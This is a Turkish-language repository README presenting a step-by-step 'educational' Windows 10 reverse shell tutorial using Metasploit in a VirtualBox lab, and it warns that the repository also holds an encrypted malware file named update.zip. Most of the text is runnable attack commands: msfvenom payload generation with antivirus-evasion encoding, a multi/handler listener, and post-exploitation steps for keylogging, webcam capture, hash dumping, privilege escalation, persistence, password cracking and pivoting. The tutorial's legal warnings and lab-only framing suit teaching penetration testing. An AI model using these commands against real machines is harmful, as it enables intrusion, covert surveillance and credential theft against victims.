> [!CAUTION]
> # 🛑 DİKKAT !!!
>
> **DEPO KISIMLARINDA BULUNAN "update.zip" DOSYASI GÜÇLÜ BİR ŞEKİLDE ŞİFRELENMİŞ ZARARLI BİR YAZILIMDIR.**
>
> * HİÇBİR ŞEKİLDE İNDİRMEYE VE KENDİ ANA BİLGİSAYARINIZDA ÇALIŞTIRMAYA ÇALIŞMAYIN.
> * BURADAKİ TÜM UYGULAMALARI **SADECE KENDİ YALITILMIŞ SANAL MAKİNELERİNİZDE** (VIRTUALBOX/VMWARE) ÇALIŞTIRIN.
> * ŞAKA NİYETLİ BİLE OLSA BİR BAŞKASININ BİLGİSAYARINDA DENEMENİZ DURUMUNDA **TCK (BİLİŞİM SUÇLARI) VE KVKK MADDELERİ GEREĞİNCE SUÇ İŞLEMİŞ OLURSUNUZ.**
> * **BU UYARIYI DİKKATE ALMAYIP İŞLEM YAPMANIZ DAHİLİNDE DOĞACAK TÜM YASAL VE TEKNİK SORUMLULUK YALNIZCA SİZE AİTTİR.**
>
> # Reverse Shell Çalışması - Windows 10 Hack (Eğitim)

> ⚠️ **DİKKAT**: Bu sadece eğitim amaçlı. İzinsiz sistemlere saldırı yapmak suçtur. Sadece kendi sanal makinelerinizde kullanın.

---

## 📚 BÖLÜM 1: TEMEL BİLGİLER

### Reverse Shell Nedir?

Normal bir bağlantıda sen hedefe bağlanırsın. Reverse shell'de ise hedef sana bağlanır. Neden? Çünkü:
- Firewall'lar genelde içeri gelen bağlantıları engeller ama dışarı gidenlere izin verir
- NAT arkasındaki sistemlere kolay erişim
- Daha az şüphe çeker

**Basit mantık:**
```
1. Sen kendi bilgisayarında bir "port" dinlemeye başlarsın (listener)
2. Hedefe bir payload (zararlı dosya) gönderirsin
3. Hedef o dosyayı çalıştırınca sana geri bağlanır
4. Boom! Hedef sistemde komut çalıştırabiliyorsun
```

### Metasploit Nedir?

Dünyanın en popüler penetrasyon testi aracı. İçinde binlerce hazır exploit ve payload var. Kali Linux'ta zaten kurulu geliyor.

**Önemli modülleri:**
- **Exploits**: Güvenlik açıklarını kullanmak için
- **Payloads**: Sisteme erişim sağlayan kodlar
- **Auxiliary**: Port tarama, şifre kırma gibi yardımcı araçlar
- **Post**: Sistemi ele geçirdikten sonraki işlemler

### MSFconsole - Ana Arayüz

Terminal'de `msfconsole` yazınca Metasploit açılır. En çok kullanacağın komutlar:

```bash
search [arama]        # Modül ara
use [modül]          # Modül seç  
show options         # Ayarları göster
set [PARAMETRE] [değer]  # Ayar yap
exploit              # Çalıştır
sessions             # Bağlantıları listele
sessions -i [id]     # Bağlantıya gir
```

### Payload Türleri

**Shell Payloads:** Basit terminal erişimi
```
windows/shell_reverse_tcp  # Windows CMD
```

**Meterpreter:** Gelişmiş payload, en güçlüsü
```
windows/meterpreter/reverse_tcp  # Windows Meterpreter
```

Meterpreter'da neler yapabilirsin:
- `sysinfo` - Sistem bilgisi
- `screenshot` - Ekran görüntüsü
- `webcam_snap` - Webcam fotoğraf
- `hashdump` - Şifre hash'lerini al
- `download/upload` - Dosya indir/yükle
- `keyscan_start` - Keylogger başlat
- `shell` - Normal CMD aç

### MSFvenom - Payload Üretici

Terminal aracı, her türlü zararlı dosya üretir:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \    # Kendi IP'n
  LPORT=4444 \              # Dinleme portu
  -f exe \                  # Format (exe, dll, php, vb)
  -o payload.exe            # Çıktı dosyası
```

**Antivirüs'tan kaçmak için:**
```bash
msfvenom ... -e x86/shikata_ga_nai -i 10 ...  # Encoder ekle
```

---

## 🛠️ BÖLÜM 2: KURULUM VE KULLANIM

### Gerekli Şeyler

- **VirtualBox** (veya VMware)
- **Kali Linux** VM
- **Windows 10** VM
- En az 8 GB RAM (16 GB ideal)

### Hızlı Kurulum

#### 1. VirtualBox Kurulumu
İndir: https://www.virtualbox.org/wiki/Downloads

**NAT Network oluştur:**
- File → Preferences → Network → NAT Networks
- Yeşil + butonuna bas
- İsim: PenTestLab
- Network: 192.168.100.0/24
- OK

#### 2. Kali Linux Kurulumu

**En kolay yol (Pre-built):**
1. İndir: https://www.kali.org/get-kali/
2. `kali-linux-2024.x-virtualbox-amd64.7z` dosyasını indir
3. 7-Zip ile aç
4. VirtualBox → File → Import Appliance → .vbox dosyasını seç
5. Settings → Network → Adapter 1 → NAT Network (PenTestLab)
6. Başlat
7. Login: `kali` / `kali`

**İlk kurulumda yap:**
```bash
sudo apt update
sudo apt upgrade -y
sudo msfdb init  # Metasploit veritabanı
ip addr show     # IP adresini öğren (örn: 192.168.100.5)
```

#### 3. Windows 10 Kurulumu

1. İndir: https://www.microsoft.com/en-us/software-download/windows10ISO
2. VirtualBox → New
   - İsim: Windows10
   - RAM: 4096 MB
   - Disk: 60 GB
3. Settings → Network → NAT Network (PenTestLab)
4. Settings → Storage → ISO'yu tak
5. Başlat ve Windows'u kur
6. Guest Additions kur (Devices → Insert Guest Additions)

**Önemli: Windows Defender'ı kapat**
- Settings → Update & Security → Windows Security
- Virus & threat protection → Manage settings
- Real-time protection → OFF
- Cloud-delivered protection → OFF

**Firewall'u da kapat:**
```powershell
# PowerShell (Admin olarak aç):
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

### Hack İşlemi (Adım Adım)

#### Adım 1: Payload Oluştur (Kali'de)

```bash
# IP adresini öğren
ip addr show  # Örn: 192.168.100.5

# Klasör oluştur
mkdir ~/hacklab
cd ~/hacklab

# Payload üret
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.5 \
  LPORT=4444 \
  -f exe \
  -o payload.exe
```

#### Adım 2: Payload'ı Windows'a Aktar

**Yöntem 1: HTTP Server (En kolay)**
```bash
# Kali'de:
python3 -m http.server 8080

# Windows'ta tarayıcıda:
http://192.168.100.5:8080/payload.exe
# İndir
```

#### Adım 3: Listener Başlat (Kali'de)

```bash
msfconsole

# MSFconsole içinde:
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.5
set LPORT 4444
exploit
```

Şimdi bekliyor... listener hazır!

#### Adım 4: Payload'ı Çalıştır (Windows'ta)

- İndirdiğin `payload.exe` dosyasına çift tıkla
- Bir terminal penceresi açılıp kapanacak (normal)

#### Adım 5: Bağlantı Geldi! (Kali'de)

```
[*] Sending stage (175686 bytes) to 192.168.100.10
[*] Meterpreter session 1 opened

meterpreter >
```

Tebrikler! Sisteme girdin 🎉

### Sistemde Ne Yapabilirsin?

```bash
# Bilgi topla
sysinfo              # Sistem bilgisi
getuid               # Kullanıcı
ipconfig             # IP adresi

# Dosya işlemleri
ls                   # Dosyaları listele
cd C:\\Users         # Dizin değiştir
download passwords.txt   # Dosya indir
upload tool.exe C:\\Temp  # Dosya yükle

# Ekran & Webcam
screenshot           # Ekran görüntüsü
webcam_snap          # Webcam çek

# Keylogger
keyscan_start        # Başlat
keyscan_dump         # Yakalananları göster
keyscan_stop         # Durdur

# Yetki yükselt
getsystem            # SYSTEM yetkisi al

# Şifre hash'leri
hashdump             # Hash'leri çıkar

# CMD shell
shell                # Windows CMD'ye geç
exit                 # Meterpreter'a dön
```

### Sorun Giderme

**Bağlantı gelmiyor?**
1. Ping testi yap (Kali ↔ Windows)
2. LHOST doğru mu kontrol et (`ip addr show`)
3. Windows Firewall kapalı mı?
4. Payload Windows'ta çalıştı mı?

**Session hemen düşüyor?**
```bash
# Migration yap (başka processe geç)
meterpreter > ps
meterpreter > migrate [PID]  # Örn: explorer.exe'nin PID'si
```

**Antivirüs siliyor?**
```bash
# Daha ağır encode et
msfvenom ... -e x86/shikata_ga_nai -i 10 ...
```

### İleri Seviye

**Persistence (Kalıcılık):**
```bash
# Her açılışta bağlansın
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.100.5
```

**Hash Kırma:**
```bash
# Kali'de (hash'leri aldıktan sonra):
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Pivoting:**
```bash
# Başka ağa geçiş
meterpreter > run autoroute -s 10.10.10.0/24
```

---

## ⚖️ YASAL UYARILAR

**ÇOK ÖNEMLİ:**
- Bu teknikler sadece kendi sistemlerinizde veya izin aldığınız yerlerde kullanılabilir
- İzinsiz sisteme girme Türk Ceza Kanunu'na göre SUÇ
- Cezası: 1-3 yıl hapis
- Profesyonel pentest için mutlaka yazılı sözleşme lazım

### Etik Kullanım
✅ Kendi sanal makinelerin  
✅ İzin aldığın sistemler  
✅ HackTheBox, TryHackMe gibi platformlar

❌ İzinsiz sistemler  
❌ Üniversite/işyeri ağı  
❌ Başkasının bilgisayarı

### Öğrenme Kaynakları

**Platformlar:**
- HackTheBox: https://www.hackthebox.eu
- TryHackMe: https://tryhackme.com
- PentesterLab: https://pentesterlab.com

**YouTube:**
- NetworkChuck
- John Hammond
- IppSec

**Sertifikalar:**
- eJPT (başlangıç)
- OSCP (ileri seviye)
- CEH (genel)

---

## 📝 Hızlı Referans

### Temel Komutlar

**MSFvenom:**
```bash
msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format] -o [dosya]
```

**MSFconsole:**
```bash
use multi/handler
set payload [payload_adı]
set LHOST [ip]
set LPORT [port]
exploit
```

**Meterpreter:**
```bash
sysinfo / getuid / ipconfig    # Bilgi
screenshot / webcam_snap        # Görüntü
download / upload               # Dosya
hashdump / getsystem           # Yetki
shell / background             # Geçiş
```

### Faydalı IP Komutları

```bash
# Kali
ip addr show
ifconfig

# Windows
ipconfig
ping [ip]
```

---

## 🤝 Son Notlar

Bu README eğitim amaçlıdır. Gerçek pentest çok daha karmaşıktır ve profesyonel eğitim gerektirir. 

Siber güvenlik bilgini iyi amaçlar için kullan. Sistemleri korumak için öğren, zarar vermek için değil.

**Başarılar!** 🚀
Bor-Code

---

